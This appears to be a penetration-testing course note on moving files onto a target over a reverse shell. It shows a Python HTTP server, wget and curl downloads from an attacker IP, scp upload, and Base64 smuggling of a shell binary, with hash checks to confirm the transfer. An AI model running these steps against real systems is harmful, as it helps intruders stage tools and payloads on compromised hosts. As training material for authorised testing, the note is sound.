# Transferring Files
During any penetration testing exercise, it is likely that we will need to transfer files to the remote server, such as enumeration scripts or exploits, or transfer data back to our attack host. While tools like Metasploit with a Meterpreter shell allow us to use the Upload command to upload a file, we need to learn methods to transfer files with a standard reverse shell.

## Using wget / curl
On eway is to run a [Python http server](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/Tools_and_setup/set_up_a_local_testing_server) on our machine and use `wget` or `curl` to download the file onto the remote host.

To run the http server we can use the following commands:
```
$ cd folder/with/scripts
$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now on the target we have to run `wget` or `curl` to download files:
```
$ wget http://10.10.14.1:8000/linenum.sh
```

```
$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

`10.10.14.1` is the IP of our own system and `8000` the port that is running the Python http server

## Using SCP
If we have already ssh access to the target we can use `scp` to upload a file to the system:
```
$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

The syntax to upload a file is `scp [LOCAL PATH] user@host:[REMOTE PATH]`

## Using Base64
If we aren't able to up- or download files due to firewall restrictions, we can Base64 encode the file, paste the string onto the target system and decode it.

To encode a binary we can use this command:
```
$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```
* `shell` is the binary that we want to upload
* `-w 0` disable line wrapping

Now we can copy the string and decode it at the target:
```
$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```
* `-d` decode

## Validating File Transfers
To validate a transferred file we can check it with the `file` command or compare the file hashes of our local file and the uploaded file:
```
$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

```
$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```